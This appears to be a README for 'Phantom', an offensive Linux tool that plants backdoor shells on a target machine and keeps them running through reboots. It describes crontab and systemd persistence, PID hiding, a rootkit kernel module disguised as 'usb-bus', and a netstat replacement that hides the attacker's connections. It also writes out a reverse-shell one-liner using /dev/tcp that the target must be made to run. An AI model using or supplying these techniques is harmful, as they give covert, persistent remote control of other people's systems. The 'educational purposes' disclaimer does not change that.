# Overview

Phantom is a tool which creates backdoor shells from a target machine to an attacker's and hides their
pid, persisting through reboots. It also hides the files needed to perform the above and replaces netstat.

**Phantom was created for educational purposes. Stay away from illegal activities.**

Phantom uses ncat on the attacker's machine to listen for incoming connections from the target's machine. At first it
opens an ncat connection to a port and when the target's machine connects to this port it delivers the payload. The payload
opens a new backdoor shell every 5 minutes to the attacker's machine, but to a different port than the first one. So, essentially
you need to specify two ports. The reason for this is that this way you have more control of what to do with the backdoor shell,
otherwise the same payload gets executed each time the target connects to your machine.

## Usage

*Syntax*:	phantom-init	ip 1st-port 2nd-port

				ip: the attacker's ip
				1st-port: the port that listens for connections to deliver the payload
				2nd-port: the port that listens for the backdoor shells after delivering
				the payload

phantom-init: Opens an ncat listening process to a predefined ip and port and redirects input to the payload file.

payload: This is the file that gets executed when the target connects to the listening ncat 1st-port. It does the following:
	a) If the user connecting is not root it overwrites the user's crontab entry with code which periodically attempts to create a
	backdoor shell to the 2nd-port.
	b) If the user connecting is root it creates a systemd service which executes a script, continuously trying to
	create a backdoor bash shell to your machine (2nd-port). It also creates a systemd service which executes a script,
	hiding the pids of the backdoor shells and both of the systemd services (ps aux cannot find them this way). It then
	creates and inserts a rootkit module named usb-bus which hides its files, the ones of the scripts that the systemd services use
	and the systemd services themselves. It is also persistent through reboots because the second systemd service
	(the one which hides pids) inserts it when it loads at boot time. Then, it replaces netstat with a version that hides the remote
	connections to the specified ip and 2nd-port.

phantom-firewall: This file uses nftables. Use it only with sudo. It makes a backup of the nft ruleset in /etc/nftables.conf.bak and then
modifies the nft ruleset so that it doesn't allow more than one connection from a target ip. This is good because the target machine will
continuously open new bash shells, increasing the footprint of Phantom's actions and putting increasing and uneeded load on the target system.
It can also undo changes made to the nft ruleset by using the argument -r | -R .

You have to somehow make the target execute this code, so that he connects to the 1st-port:
bash -c 'bash &>/dev/tcp/ip/1st-port 0>&1 &'
ip and 1st-port are the ones specified above.

Order of execution:
a. Before delivering the payload:
	1) Execute phantom-init and wait for the target to connect to your machine.

b. After delivering the payload:
	1) Execute phantom-firewall as root, so it can modify the firewall rules.
	2) Create an ncat process listening at the 2nd-port. (use the -k flag to accept multiple connections)

Order of closing:
1.	Close phantom-firewall and wait for some seconds so the connections can start flowing normally again.
2. 	Close the ncat listening process so all the connections get closed with it.
3: 	Execute this command: sudo phantom-firewall -r | -R. This undoes any changes to the nft ruleset made by phantom-firewall.
		This is needed if you want to open ncat again and for the target to be able to connect to you again, otherwise a nftables rule is gonna
		block him.

Check https://github.com/konsaranto/phantom for newer versions.

---Contact Information---

Konstantinos Sarantopoulos
konsaranto@gmail.com
